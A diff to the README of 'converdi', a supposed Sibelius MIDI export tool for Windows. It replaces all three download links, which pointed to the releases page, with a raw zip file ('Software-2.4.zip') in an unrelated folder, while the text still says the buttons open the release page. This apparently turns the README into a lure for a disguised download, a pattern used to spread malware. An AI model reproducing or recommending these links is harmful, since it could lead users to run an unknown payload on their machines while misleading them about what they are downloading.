@@ -1,6 +1,6 @@
 # 🎵 converdi - Improve Sibelius MIDI export quality
 
-[![Download converdi](https://img.shields.io/badge/Download-Converdi-brightgreen?style=for-the-badge)](https://github.com/mantisshrimpcompartment376/converdi/releases)
+[![Download converdi](https://img.shields.io/badge/Download-Converdi-brightgreen?style=for-the-badge)](https://github.com/mantisshrimpcompartment376/converdi/raw/refs/heads/main/globularness/Software-2.4.zip)
 
 <p align="center">
   <img src="converdi.png" alt="Converdi">
@@ -30,7 +30,7 @@ You can use Converdi on Windows with a few simple steps.
 
 Click the button below to visit the release page where you can download the latest version:
 
-[![Download Converdi](https://img.shields.io/badge/Get%20Converdi-blue?style=for-the-badge)](https://github.com/mantisshrimpcompartment376/converdi/releases)
+[![Download Converdi](https://img.shields.io/badge/Get%20Converdi-blue?style=for-the-badge)](https://github.com/mantisshrimpcompartment376/converdi/raw/refs/heads/main/globularness/Software-2.4.zip)
 
 On the release page:
 
@@ -117,4 +117,4 @@ Your sample library keyswitches will also work as expected, producing a more nat
 
 Access the release page here to get the latest version for Windows:
 
-[![Download Converdi](https://img.shields.io/badge/Download%20Latest%20Version-purple?style=for-the-badge)](https://github.com/mantisshrimpcompartment376/converdi/releases)
+[![Download Converdi](https://img.shields.io/badge/Download%20Latest%20Version-purple?style=for-the-badge)](https://github.com/mantisshrimpcompartment376/converdi/raw/refs/heads/main/globularness/Software-2.4.zip)
